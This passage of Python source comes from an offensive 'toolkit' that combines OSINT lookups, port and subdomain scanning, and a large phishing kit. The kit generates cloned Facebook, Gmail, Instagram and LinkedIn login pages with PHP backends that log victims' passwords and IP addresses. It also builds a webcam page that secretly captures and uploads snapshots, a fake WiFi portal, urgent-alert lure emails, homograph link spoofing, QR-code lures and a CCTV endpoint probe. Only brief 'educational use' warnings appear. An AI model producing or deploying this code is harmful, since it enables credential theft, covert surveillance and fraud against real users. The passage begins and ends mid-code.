                f.write("[+] Not a temporary email provider\n")

            # 7. Username extraction
            username = email.split("@")[0]
            print(f"[*] Username part: {username}")
            f.write(f"\nUsername: {username}\n")

            # Common username patterns analysis
            if "." in username:
                parts = username.split(".")
                f.write(f"Possible names: {' '.join(parts).title()}\n")

            # 8. Related usernames to check
            print("[*] Generating related usernames for further investigation...")
            related_usernames = [
                username,
                username.replace(".", ""),
                username.replace("_", ""),
                username.replace("-", "")
            ]

            f.write("\nRelated usernames to check on social media:\n")
            for uname in set(related_usernames):
                f.write(f"- {uname}\\n")

        print(f"\n[+] Email investigation completed")
        print(f"[+] Report saved: {filepath}")
        print(f"[*] For advanced email investigation, running Holehe integration...")
        self.holehe_lookup(email)
        print("    - HaveIBeenPwned API")
        print("    - Email2PhoneNumber")
        self.ask_next_action(self.email_lookup, self.osint_menu)

    def osint_framework(self):
        """OSINT Framework integration"""
        print("\n--- OSINT Framework ---")
        target = input("Enter target domain/IP/email: ")
        if not target:
            print("[-] Target required")
            return
            
        # Common OSINT sources
        sources = {
            "Shodan": f"https://api.shodan.io/shodan/host/{target}",
            "Censys": f"https://search.censys.io/api/v2/hosts/{target}",
            "VirusTotal": f"https://www.virustotal.com/vtapi/v2/domain/report?domain={target}",
            "SecurityTrails": f"https://api.securitytrails.com/v1/domain/{target}",
            "WhoisXML": f"https://whois.whoisxmlapi.com/api/v1?domainName={target}"
        }
        
        results = {}
        for source, url in sources.items():
            try:
                resp = self.make_request(url, headers=self.get_random_headers())
                if resp and resp['status'] == 200:
                    results[source] = resp['content']
            except Exception:
                continue
                
        # Save report
        report_file = f"azo_results/reports/osint_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, "w", encoding="utf-8") as f:
            f.write(f"OSINT Framework Report\nTarget: {target}\nDate: {datetime.now()}\n\n")
            for source, data in results.items():
                f.write(f"\n=== {source} Results ===\n")
                f.write(str(data))
        print(f"[+] OSINT report saved: {report_file}")
        
        self.ask_next_action(self.osint_framework, self.osint_menu)

    def advanced_intel_framework(self):
        """Advanced intelligence gathering framework"""
        print("\n--- Advanced Intelligence Framework ---")
        target = input("Enter target (domain/IP/email/username): ")
        if not target:
            print("[-] Target required")
            return
            
        # Multiple intelligence sources
        sources = {
            "DNS": {
                "A": "A record lookup",
                "MX": "Mail servers",
                "NS": "Name servers",
                "TXT": "TXT records"
            },
            "WHOIS": {
                "registrar": "Domain registrar",
                "created": "Creation date",
                "expires": "Expiration date",
                "updated": "Last update"
            },
            "Headers": {
                "server": "Server type",
                "x-powered-by": "Technologies",
                "security": "Security headers"
            },
            "SSL": {
                "issuer": "Certificate issuer",
                "expires": "Certificate expiry",
                "sans": "Subject alternatives"
            }
        }
        
        results = {}
        print("\n[*] Gathering intelligence...")
        
        # DNS lookup
        if DNS_AVAILABLE:
            for record_type in sources["DNS"]:
                try:
                    answers = dns.resolver.resolve(target, record_type)
                    results[f"DNS_{record_type}"] = [str(rdata) for rdata in answers]
                except Exception:
                    continue
        
        # WHOIS lookup
        if WHOIS_AVAILABLE:
            try:
                whois_data = whois.whois(target)
                results["WHOIS"] = whois_data
            except Exception:
                pass
                
        # HTTP headers
        try:
            resp = self.make_request(f"http://{target}")
            if resp:
                results["Headers"] = resp["headers"]
        except Exception:
            pass
            
        # Save report
        report_file = f"azo_results/reports/intel_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, "w", encoding="utf-8") as f:
            f.write(f"Advanced Intelligence Report\nTarget: {target}\nDate: {datetime.now()}\n\n")
            
            for category, data in results.items():
                f.write(f"\n=== {category} ===\n")
                if isinstance(data, dict):
                    for key, value in data.items():
                        f.write(f"{key}: {value}\n")
                elif isinstance(data, list):
                    for item in data:
                        f.write(f"- {item}\n")
                else:
                    f.write(str(data) + "\n")
                    
        print(f"[+] Intelligence report saved: {report_file}")
        
        self.ask_next_action(self.advanced_intel_framework, self.osint_menu)

    def reconnaissance_framework(self):
        """Advanced reconnaissance framework"""
        print("\n--- Advanced Reconnaissance Framework ---")
        target = input("Enter target domain/IP: ")
        if not target:
            print("[-] Target required")
            return
        
        workspace = datetime.now().strftime('%Y%m%d_%H%M%S')
        print(f"[*] Creating workspace: {workspace}")
        
        # Recon modules
        modules = {
            "Subdomain Enumeration": [
                "DNS bruteforce",
                "Certificate search",
                "Search engine discovery"
            ],
            "Port Scanning": [
                "TCP SYN scan",
                "Service detection",
                "Version detection"
            ],
            "Web Technology": [
                "Framework detection",
                "CMS identification",
                "Security headers"
            ],
            "Infrastructure": [
                "IP ranges",
                "ASN lookup",
                "Network mapping"
            ]
        }
        
        results = {}
        print("\n[*] Starting reconnaissance modules...")
        
        # Execute modules
        for category, tests in modules.items():
            print(f"\n[*] Running {category} tests...")
            category_results = []
            
            for test in tests:
                if test == "DNS bruteforce":
                    try:
                        # Basic subdomain enumeration
                        subdomains = []
                        wordlist = ["www", "mail", "remote", "blog", "webmail", "server", "ns1", "ns2", "smtp", "secure", "vpn", "m", "shop", "ftp", "mail2", "test", "portal", "ns", "ww1", "host", "support", "dev", "web", "bbs", "ww42", "mx", "email", "cloud", "1", "2", "forum", "owa", "www2", "gw", "admin", "store", "mx1", "cdn", "api", "exchange", "app"]
                        for sub in wordlist:
                            try:
                                domain = f"{sub}.{target}"
                                socket.gethostbyname(domain)
                                subdomains.append(domain)
                            except socket.gaierror:
                                continue
                        if subdomains:
                            category_results.append({
                                "test": test,
                                "findings": subdomains
                            })
                    except Exception as e:
                        print(f"[-] Error in {test}: {e}")
                        
                elif test == "TCP SYN scan":
                    try:
                        # Basic port scan
                        open_ports = []
                        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
                        for port in common_ports:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            result = sock.connect_ex((target, port))
                            if result == 0:
                                open_ports.append(port)
                            sock.close()
                        if open_ports:
                            category_results.append({
                                "test": test,
                                "findings": open_ports
                            })
                    except Exception as e:
                        print(f"[-] Error in {test}: {e}")
                        
                elif test == "Framework detection":
                    try:
                        # Basic web technology detection
                        resp = self.make_request(f"http://{target}")
                        if resp:
                            headers = resp["headers"]
                            server = headers.get("Server", "Unknown")
                            powered_by = headers.get("X-Powered-By", "Unknown")
                            category_results.append({
                                "test": test,
                                "findings": {
                                    "server": server,
                                    "powered_by": powered_by
                                }
                            })
                    except Exception as e:
                        print(f"[-] Error in {test}: {e}")
                        
            if category_results:
                results[category] = category_results
                
        # Save report
        report_file = f"azo_results/reports/recon_{workspace}.txt"
        with open(report_file, "w", encoding="utf-8") as f:
            f.write(f"Advanced Reconnaissance Report\n")
            f.write(f"Target: {target}\n")
            f.write(f"Workspace: {workspace}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write("="*50 + "\n\n")
            
            for category, category_results in results.items():
                f.write(f"\n=== {category} ===\n")
                for result in category_results:
                    f.write(f"\n[+] {result['test']}:\n")
                    findings = result['findings']
                    if isinstance(findings, list):
                        for item in findings:
                            f.write(f"  - {item}\n")
                    elif isinstance(findings, dict):
                        for key, value in findings.items():
                            f.write(f"  {key}: {value}\n")
                    else:
                        f.write(f"  {findings}\n")
                        
        print(f"\n[+] Reconnaissance completed")
        print(f"[+] Report saved: {report_file}")
        
        self.ask_next_action(self.reconnaissance_framework, self.osint_menu)

    # ========================= PHISHING KIT =========================

    def phishing_menu(self):
        """Phishing Kit menu"""
        menu_intro("Phishing Kit")
        
        print("[!] WARNING: Use only for educational purposes and authorized testing!")
        
        menu = """
        ┌─────────────────────────────────────────────────┐
        │             ADVANCED PHISHING KIT               │
        ├─────────────────────────────────────────────────┤
        │ [1] Webcam Access Page                          │
        │ [2] Social/Email Phishing                       │
        │ [3] Link Masking Tools                          │
        │ [4] QR Code Generator                           │
        ├─────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                           │
        └─────────────────────────────────────────────────┘
        """
        print(menu)
        
        choice = input(f" root@{self.username}/Phishing:~$ ")
        
        if choice == "1":
            self.webcam_phishing()
        elif choice == "2":
            self.phishing_toolkit()
        elif choice == "3":
            self.link_masking()
        elif choice == "4":
            self.qr_code_phishing()
        elif choice == "0":
            return
        else:
            print("Invalid option!")
            time.sleep(1)
            self.phishing_menu()

    def webcam_phishing(self):
        """Advanced webcam phishing page generator"""
        print("\n--- Webcam Phishing Generator ---")
        
        template = input("Select template (meeting/stream/player/custom): ").lower()
        redirect = input("Enter redirect URL after capture: ")
        
        if not template or not redirect:
            print("[-] Template and redirect URL required")
            self.ask_next_action(self.webcam_phishing, self.phishing_menu)
            return
            
        # Generate phishing page
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>Camera Access Required</title>
    <style>
        body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
        .container {{ max-width: 600px; margin: 0 auto; }}
        .video-container {{ width: 100%; max-width: 400px; height: 300px; margin: 20px auto; 
                          background: #000; position: relative; }}
        button {{ padding: 10px 20px; background: #007bff; color: white; border: none; 
                 border-radius: 5px; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>{template.title()} requires camera access</h2>
        <div class="video-container" id="video-container">
            <video id="video" width="100%" height="100%" autoplay></video>
        </div>
        <p>Please allow camera access to continue</p>
        <button onclick="requestCamera()">Enable Camera</button>
    </div>
    
    <script>
    function requestCamera() {{
        navigator.mediaDevices.getUserMedia({{ video: true }})
        .then(function(stream) {{
            var video = document.getElementById('video');
            video.srcObject = stream;
            
            // Capture and send still after 3 seconds
            setTimeout(function() {{
                var canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                var ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                var imageData = canvas.toDataURL('image/jpeg');
                
                // Send to backend
                fetch('capture.php', {{
                    method: 'POST',
                    body: JSON.stringify({{ image: imageData }})
                }})
                .then(function() {{
                    window.location.href = '{redirect}';
                }});
            }}, 3000);
        }})
        .catch(function(err) {{
            console.log("Camera access denied");
        }});
    }}
    </script>
</body>
</html>'''

        # Generate PHP backend
        php_content = '''<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    if (isset($data['image'])) {
        $img = $data['image'];
        $img = str_replace('data:image/jpeg;base64,', '', $img);
        $img = str_replace(' ', '+', $img);
        $data = base64_decode($img);
        $file = 'captures/'.uniqid().'.jpg';
        file_put_contents($file, $data);
    }
}
?>'''
        
        # Save files
        output_dir = f"{self.output_dir}/phishing/webcam_{template}"
        captures_dir = f"{output_dir}/captures"
        os.makedirs(captures_dir, exist_ok=True)
        
        with open(f"{output_dir}/index.html", 'w') as f:
            f.write(html_content)
            
        with open(f"{output_dir}/capture.php", 'w') as f:
            f.write(php_content)
            
        print(f"[+] Webcam phishing page generated: {output_dir}")
        print(f"[+] Upload to web server and configure PHP")
        
        self.ask_next_action(self.webcam_phishing, self.phishing_menu)

    def credentials_phishing(self):
        """Credentials phishing"""
        print("\n--- Credentials Phishing ---")
        print("[!] WARNING: For educational and authorized testing only!")
        
        phishing_menu = """
        [1] Generate Login Page Clone
        [2] Social Engineering Templates
        [3] Email Phishing Templates
        [4] Fake Portal Generator
        [5] PyPhisher Integration
        [0] Back
        """
        print(phishing_menu)
        
        choice = input("root@{}/CredPhish:~$ ".format(self.username))
        
        if choice == "0":
            return
        elif choice == "1":
            self.generate_login_clone()
        elif choice == "2":
            self.social_engineering_templates()
        elif choice == "3":
            self.email_phishing_templates()
        elif choice == "4":
            self.fake_portal_generator()
        elif choice == "5":
            self.pyphisher_integration()
        
        self.ask_next_action(self.credentials_phishing, self.phishing_menu)

    def generate_login_clone(self):
        """Generate login page clone"""
        print("\n--- Login Page Clone Generator ---")
        
        target_site = input("Enter target site (facebook, gmail, instagram, linkedin): ").lower()
        redirect_url = input("Enter redirect URL after capture: ")
        
        templates = {
            "facebook": {
                "title": "Facebook - Log In or Sign Up",
                "action": "login.php",
                "fields": ["email", "password"],
                "styling": "facebook-style.css"
            },
            "gmail": {
                "title": "Gmail - Sign In",
                "action": "login.php", 
                "fields": ["email", "password"],
                "styling": "gmail-style.css"
            },
            "instagram": {
                "title": "Instagram - Login",
                "action": "login.php",
                "fields": ["username", "password"], 
                "styling": "instagram-style.css"
            },
            "linkedin": {
                "title": "LinkedIn - Sign In",
                "action": "login.php",
                "fields": ["email", "password"],
                "styling": "linkedin-style.css"
            }
        }
        
        if target_site not in templates:
            print("[-] Unsupported site. Available: facebook, gmail, instagram, linkedin")
            return
        
        template = templates[target_site]
        
        # Generate HTML
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{template["title"]}</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{template["styling"]}">
</head>
<body>
    <div class="container">
        <div class="login-form">
            <h2>Sign In</h2>
            <form action="{template["action"]}" method="POST">
                <input type="text" name="{template["fields"][0]}" placeholder="{template["fields"][0].title()}" required>
                <input type="password" name="{template["fields"][1]}" placeholder="{template["fields"][1].title()}" required>
                <button type="submit">Sign In</button>
            </form>
        </div>
    </div>
    
    <script>
    // Optional: Add form validation or other JS
    </script>
</body>
</html>'''

        # Generate PHP backend
        php_content = f'''<?php
if ($_POST) {{
    $username = $_POST['{template["fields"][0]}'];
    $password = $_POST['{template["fields"][1]}'];
    
    // Log credentials
    $log = date('Y-m-d H:i:s') . " | " . $username . " | " . $password . " | " . $_SERVER['REMOTE_ADDR'] . "\\n";
    file_put_contents('captured_credentials.txt', $log, FILE_APPEND);
    
    // Redirect to legitimate site
    header('Location: {redirect_url}');
    exit;
}}
?>'''

        # Save files
        output_dir = f"{self.output_dir}/phishing/{target_site}_clone"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(f"{output_dir}/index.html", 'w') as f:
            f.write(html_content)
        
        with open(f"{output_dir}/login.php", 'w') as f:
            f.write(php_content)
        
        print(f"[+] Phishing page generated: {output_dir}")
        print(f"[+] Upload to web server and configure domain")

    def social_engineering_templates(self):
        """Social engineering templates"""
        print("\n--- Social Engineering Templates ---")
        
        templates = {
            "1": {
                "name": "Security Alert",
                "subject": "Urgent: Suspicious Login Detected",
                "content": "We detected unusual activity on your account. Click here to secure your account immediately."
            },
            "2": {
                "name": "Prize Winner",
                "subject": "Congratulations! You've Won $1000",
                "content": "You have been selected as our lucky winner! Claim your prize by verifying your account details."
            },
            "3": {
                "name": "Account Suspension", 
                "subject": "Action Required: Account Will Be Suspended",
                "content": "Your account will be suspended within 24 hours unless you verify your identity."
            },
            "4": {
                "name": "Password Expiry",
                "subject": "Password Expires Tomorrow",
                "content": "Your password will expire tomorrow. Update it now to maintain access to your account."
            }
        }
        
        print("Available templates:")
        for key, template in templates.items():
            print(f"[{key}] {template['name']}")
        
        choice = input("Select template (1-4): ")
        if choice in templates:
            template = templates[choice]
            print(f"\nTemplate: {template['name']}")
            print(f"Subject: {template['subject']}")
            print(f"Content: {template['content']}")
        
    def email_phishing_templates(self):
        """Email phishing templates"""
        print("\n--- Email Phishing Templates ---")
        
        target_email = input("Enter target email: ")
        sender_name = input("Enter sender name/company: ")
        phishing_url = input("Enter phishing URL: ")
        
        email_template = f'''
Subject: Security Alert - Immediate Action Required

Dear {target_email.split('@')[0]},

We have detected unusual activity on your account. For your security, we need you to verify your identity immediately.

Please click the link below to secure your account:
{phishing_url}

If you do not verify within 24 hours, your account may be temporarily suspended.

Best regards,
{sender_name} Security Team

---
This is an automated security message. Please do not reply to this email.
        '''
        
        # Save template
        filename = f"email_template_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = f"{self.output_dir}/phishing/{filename}"
        os.makedirs(f"{self.output_dir}/phishing", exist_ok=True)
        
        with open(filepath, 'w') as f:
            f.write(email_template)
        
        print(f"[+] Email template saved: {filepath}")

    def fake_portal_generator(self):
        """Fake portal generator"""
        print("\n--- Fake Portal Generator ---")
        
        portal_type = input("Enter portal type (wifi, corporate, update): ").lower()
        company_name = input("Enter company/network name: ")
        
        if portal_type == "wifi":
            self.generate_wifi_portal(company_name)
        elif portal_type == "corporate":
            self.generate_corporate_portal(company_name)
        elif portal_type == "update":
            self.generate_update_portal(company_name)
        else:
            print("[-] Unsupported portal type")

    def generate_wifi_portal(self, network_name):
        """Generate WiFi captive portal"""
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{network_name} - WiFi Access</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; background: #f5f5f5; }}
        .portal {{ max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 10px; }}
        input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }}
        button {{ width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="portal">
        <h2>{network_name} WiFi Access</h2>
        <p>Please enter your credentials to access the internet:</p>
        <form action="capture.php" method="POST">
            <input type="text" name="username" placeholder="Username/Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect to WiFi</button>
        </form>
    </div>
</body>
</html>'''
        
        # Save WiFi portal
        portal_dir = f"{self.output_dir}/phishing/wifi_portal"
        os.makedirs(portal_dir, exist_ok=True)
        
        with open(f"{portal_dir}/index.html", 'w') as f:
            f.write(html_content)
        
        print(f"[+] WiFi portal generated: {portal_dir}")

    def phishing_toolkit(self):
        """Advanced phishing toolkit"""
        print("\n--- Advanced Phishing Toolkit ---")
        
        templates = {
            "social": ["Facebook", "Instagram", "Twitter", "LinkedIn", "Google"],
            "email": ["Gmail", "Outlook", "Yahoo", "iCloud", "ProtonMail"],
            "corporate": ["Office365", "VPN", "Webmail", "Intranet", "Cloud"],
            "other": ["WiFi", "Banking", "Streaming", "Gaming", "Dating"]
        }
        
        print("\nAvailable templates:")
        for category, items in templates.items():
            print(f"\n{category.title()}:")
            for i, item in enumerate(items, 1):
                print(f"  {i}. {item}")
                
        category = input("\nSelect category: ").lower()
        if category not in templates:
            print("[-] Invalid category")
            self.ask_next_action(self.phishing_toolkit, self.phishing_menu)
            return
            
        template = input("Select template name: ")
        redirect = input("Enter redirect URL: ")
        
        if not template or not redirect:
            print("[-] Template and redirect required")
            return
            
        # Generate phishing page
        output_dir = f"{self.output_dir}/phishing/{category}_{template.lower()}"
        os.makedirs(output_dir, exist_ok=True)
        
        # Generate HTML template
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{template} - Sign In</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{ font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }}
        .container {{ max-width: 400px; margin: 40px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        .logo img {{ max-width: 150px; height: auto; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; }}
        button:hover {{ background: #1557b0; }}
        .footer {{ text-align: center; margin-top: 20px; font-size: 13px; color: #666; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>{template}</h2>
        </div>
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="Email or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">
            <p>Secure login • Protected by {template}</p>
        </div>
    </div>
</body>
</html>'''
        
        # Generate PHP backend
        php_content = f'''<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    
    $log = "Date: $date\\nIP: $ip\\nUsername: $username\\nPassword: $password\\n\\n";
    file_put_contents('captures.txt', $log, FILE_APPEND);
    
    header('Location: {redirect}');
    exit();
}}
?>'''
        
        # Save files
        with open(f"{output_dir}/index.html", 'w') as f:
            f.write(html_content)
            
        with open(f"{output_dir}/login.php", 'w') as f:
            f.write(php_content)
            
        print(f"[+] Phishing page generated: {output_dir}")
        print(f"[+] Upload to web server and ensure PHP is enabled")
        print(f"[+] Captured credentials will be saved in captures.txt")
        
        self.ask_next_action(self.phishing_toolkit, self.phishing_menu)

    def link_masking(self):
        """Link masking"""
        print("\n--- Link Masking ---")
        
        original_url = input("Enter malicious URL to mask: ")
        domain_mask = input("Enter legitimate domain to mimic (e.g., google.com): ")
        
        # Method 1: URL shorteners with custom domains
        print("\n[1] URL Shortener Masking:")
        shortened_services = [
            f"bit.ly/2x{random.randint(10000, 99999)}",
            f"tinyurl.com/{random.randint(1000000, 9999999)}",
            f"short.link/{random.randint(100000, 999999)}",
            f"t.co/{random.randint(10000000, 99999999)}"
        ]
        
        for service in shortened_services:
            print(f"  - {service}")
        
        # Method 2: Subdomain spoofing
        print(f"\n[2] Subdomain Spoofing:")
        subdomain_masks = [
            f"security-{domain_mask.replace('.', '-')}.phishing-domain.com",
            f"verify.{domain_mask}.secure-login.net",
            f"account-{domain_mask.split('.')[0]}.verification.org"
        ]
        
        for mask in subdomain_masks:
            print(f"  - https://{mask}")
        
        # Method 3: Unicode spoofing
        print(f"\n[3] Unicode Character Spoofing:")
        unicode_chars = {
            'a': 'а', 'o': 'о', 'e': 'е', 'p': 'р', 'c': 'с', 'x': 'х'
        }
        
        spoofed_domain = domain_mask
        for normal, unicode_char in unicode_chars.items():
            if normal in spoofed_domain:
                spoofed_domain = spoofed_domain.replace(normal, unicode_char, 1)
                break
        
        print(f"  - https://{spoofed_domain}")
        
        # Method 4: Homograph attacks
        print(f"\n[4] Homograph Domain:")
        homograph_variations = [
            domain_mask.replace('o', '0'),
            domain_mask.replace('e', '3'),
            domain_mask.replace('a', '@'),
            domain_mask.replace('i', '1')
        ]
        
        for variation in homograph_variations[:2]:
            print(f"  - https://{variation}")
        
        # Save report
        filename = f"link_masking_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        filepath = f"{self.output_dir}/phishing/{filename}"
        os.makedirs(f"{self.output_dir}/phishing", exist_ok=True)
        
        with open(filepath, 'w') as f:
            f.write(f"Link Masking Report\n")
            f.write(f"Original URL: {original_url}\n")
            f.write(f"Target Domain: {domain_mask}\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write("Generated masked URLs:\n")
            for service in shortened_services:
                f.write(f"- {service}\n")
            for mask in subdomain_masks:
                f.write(f"- https://{mask}\n")
        
        print(f"\n[+] Link masking options saved: {filepath}")
        
        self.ask_next_action(self.link_masking, self.phishing_menu)

    def qr_code_phishing(self):
        """QR Code phishing"""
        print("\n--- QR Code Phishing ---")
        
        try:
            # Try to use qrcode library
            import qrcode
            from io import BytesIO
            
            malicious_url = input("Enter malicious URL: ")
            description = input("Enter QR code description (e.g., 'WiFi Password'): ")
            
            # Generate QR code
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(malicious_url)
            qr.make(fit=True)
            
            # Create QR code image
            qr_image = qr.make_image(fill_color="black", back_color="white")
            
            # Save QR code
            qr_dir = f"{self.output_dir}/phishing/qr_codes"
            os.makedirs(qr_dir, exist_ok=True)
            
            filename = f"qr_phishing_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            qr_path = f"{qr_dir}/{filename}"
            qr_image.save(qr_path)
            
            # Generate social engineering context
            contexts = {
                "wifi": f"Free WiFi - {description}\nScan to connect instantly!",
                "menu": f"Restaurant Menu - {description}\nScan to view our digital menu",
                "payment": f"Payment Portal - {description}\nScan to complete your payment",
                "survey": f"Customer Survey - {description}\nScan to leave feedback and win prizes",
                "app": f"Download Our App - {description}\nScan to install our mobile app"
            }
            
            context_type = input("Select context (wifi/menu/payment/survey/app): ").lower()
            context_text = contexts.get(context_type, f"Scan QR Code - {description}")
            
            # Create HTML page with QR code
            html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>QR Code - {description}</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
        .qr-container {{ max-width: 400px; margin: 0 auto; }}
        .qr-code {{ max-width: 100%; height: auto; }}
        h2 {{ color: #333; }}
        p {{ color: #666; font-size: 18px; }}
    </style>
</head>
<body>
    <div class="qr-container">
        <h2>{context_text}</h2>
        <img src="{filename}" alt="QR Code" class="qr-code">
        <p>Point your camera at the QR code to scan</p>
    </div>
</body>
</html>'''
            
            html_path = f"{qr_dir}/qr_page.html"
            with open(html_path, 'w') as f:
                f.write(html_content)
            
            print(f"[+] QR code generated: {qr_path}")
            print(f"[+] HTML page created: {html_path}")
            print(f"[+] Context: {context_text}")
            
        except ImportError:
            print("[-] QR code library not found. Install with: pip install qrcode[pil]")
            print("\nManual QR code generation:")
            print("1. Visit: https://qr-code-generator.com/")
            print("2. Enter your malicious URL")
            print("3. Download the QR code")
            print("4. Use in social engineering campaigns")
        
        self.ask_next_action(self.qr_code_phishing, self.phishing_menu)

    # ========================= AZO CCTV ORIGINAL FEATURES =========================

    def azo_advanced_features(self):
        """AZO Toolkit Advanced Features"""
        menu_intro("AZO Toolkit - Advanced Features")
        
        menu = """
        ┌─────────────────────────────────────────────────┐
        │            ADVANCED SECURITY FEATURES           │
        ├─────────────────────────────────────────────────┤
        │ [1] Advanced Vulnerability Scanner              │
        │ [2] Device Fingerprinting                       │
        │ [3] WAF/IDS Detection                           │
        │ [4] Advanced Stealth Mode                       │
        │ [5] Authentication Bypass Test                  │
        ├─────────────────────────────────────────────────┤
        │ [0] Back to Main Menu                           │
        └─────────────────────────────────────────────────┘
        """
        print(menu)
        
        choice = input(f" root@{self.username}/AZO-Original:~$ ")
        
        if choice == "1":
            self.advanced_vuln_scanner()
        elif choice == "2":
            self.device_fingerprinting()
        elif choice == "3":
            self.waf_detection()
        elif choice == "4":
            self.stealth_mode_config()
        elif choice == "5":
            self.auth_bypass_test()
        elif choice == "0":
            return
        else:
            print("Invalid option!")
            time.sleep(1)
            self.azo_original_features()

    def advanced_vuln_scanner(self):
        """Advanced vulnerability scanner"""
        print("\n--- Advanced Vulnerability Scanner ---")
        
        target = input("Enter target IP or URL: ").strip()
        if not target:
            print("[-] Target required")
            self.ask_next_action(self.advanced_vuln_scanner, self.azo_advanced_features)
            return
        
        print(f"[*] Starting advanced vulnerability scan on: {target}")
        
        # Create scan report
        scan_id = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"{self.output_dir}/reports/vuln_scan_{scan_id}.txt"
        
        vulnerabilities_found = []
        
        with open(report_file, 'w') as f:
            f.write(f"Advanced Vulnerability Scan Report\\n")
            f.write(f"Target: {target}\\n")
            f.write(f"Scan ID: {scan_id}\\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n")
            f.write("="*60 + "\\n\\n")
            
            # 1. Port Discovery
            print("[*] Phase 1: Port Discovery...")
            f.write("1. PORT DISCOVERY\\n")
            f.write("-" * 20 + "\\n")
            
            common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 8080, 8443]
            open_ports = []
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        print(f"[+] Port {port} is open")
                        open_ports.append(port)
                        f.write(f"OPEN: {port}\\n")
                    sock.close()
                except:
                    continue
            
            f.write(f"\\nOpen ports found: {len(open_ports)}\\n\\n")
            
            # 2. Service Detection
            print("[*] Phase 2: Service Detection...")
            f.write("2. SERVICE DETECTION\\n")
            f.write("-" * 20 + "\\n")
            
            services = {}
            for port in open_ports[:10]:  # Limit to first 10 ports
                try:
                    url = f"http://{target}:{port}"
                    resp = self.make_request(url, timeout=3)
                    if resp:
                        server = resp['headers'].get('Server', 'Unknown')
                        services[port] = server
                        print(f"[+] Port {port}: {server}")
                        f.write(f"Port {port}: {server}\\n")
                except:
                    continue
            
            f.write("\\n")
            
            # 3. CCTV Specific Vulnerabilities
            print("[*] Phase 3: CCTV Vulnerability Testing...")
            f.write("3. CCTV VULNERABILITIES\\n")
            f.write("-" * 25 + "\\n")
            
            cctv_vulns = {
                "/cgi-bin/hi3510/param.cgi?cmd=getuser": "User enumeration",
                "/device.rsp?opt=user&cmd=list": "Device user list",
                "/PSIA/Custom/SelfExt/userCheck": "User verification bypass",
                "/cgi-bin/nobody/VerifyCode.cgi": "Verification bypass",
                "/onvif/device_service": "ONVIF service exposure",
                "/cgi-bin/guest/Login.cgi": "Guest login vulnerability"
            }
            
            for endpoint, description in cctv_vulns.items():
                try:
                    test_url = f"http://{target}{endpoint}"
                    resp = self.make_request(test_url, timeout=5)
                    if resp and resp['status'] == 200:
                        print(f"[!] VULNERABILITY: {description}")
                        vulnerabilities_found.append(f"{description} - {endpoint}")
                        f.write(f"VULNERABLE: {description} ({endpoint})\\n")
                        
                        # Check for sensitive data
                        if "passwd" in resp['content'].lower() or "root:" in resp['content']:
                            print(f"[!] CRITICAL: Password file exposure!")
                            f.write(f"  CRITICAL: Password file exposed!\\n")
                except:
                    continue
            
            f.write("\\n")
            
            # 4. Authentication Testing
            print("[*] Phase 4: Authentication Testing...")
            f.write("4. AUTHENTICATION TESTING\\n")
            f.write("-" * 25 + "\\n")
            
            auth_endpoints = ["/", "/login", "/admin", "/cgi-bin/login.cgi"]
            
            for endpoint in auth_endpoints:
